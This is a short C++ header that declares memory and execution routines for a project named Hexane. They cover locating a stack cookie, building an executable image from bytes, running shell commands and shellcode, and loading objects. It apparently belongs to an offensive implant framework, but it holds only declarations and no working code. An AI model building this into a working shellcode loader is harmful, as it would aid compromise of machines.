#ifndef HEXANE_CORELIB_MEMORY_HPP
#define HEXANE_CORELIB_MEMORY_HPP

#include <core/corelib.hpp>

namespace Memory {
    namespace Methods {
        UINT_PTR
        FUNCTION
            FindStackCookie();

        PRESOURCE
        FUNCTION
            FindIntResource(HMODULE base, INT rsrc_id);

        PEXECUTABLE
        FUNCTION
            CreateImage(UINT8 *data);

        VOID
        FUNCTION
            ZeroFree(VOID *pointer, SIZE_T size);
    }

    namespace Context {
        BOOL
        FUNCTION
            ContextInit();

        VOID
        FUNCTION
            ContextDestroy();
    }

    namespace Execute {
        BOOL
        FUNCTION
            ExecuteCommand(PARSER parser);

        BOOL
        FUNCTION
            ExecuteShellcode(PARSER parser);

        VOID
        FUNCTION
            LoadObject(PARSER parser);
    }
}
#endif //HEXANE_CORELIB_MEMORY_HPP
